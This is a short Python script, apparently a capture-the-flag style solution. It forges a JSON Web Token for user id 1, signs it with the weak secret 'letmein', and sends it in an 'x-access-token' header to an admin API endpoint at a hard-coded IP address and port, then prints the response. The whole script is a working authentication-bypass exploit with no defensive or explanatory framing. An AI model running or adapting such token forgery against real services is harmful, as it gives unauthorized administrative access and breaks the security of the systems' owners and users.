import requests
import jwt
url ="http://34.89.213.64:31977/api/app/admin"
payload = {"id":1,"iat":1617389291,"exp":1617475691}
token = jwt.encode(payload,"letmein", algorithm='HS256')
print(token)
r = requests.get(url, headers={"x-access-token": token})
print(r.text)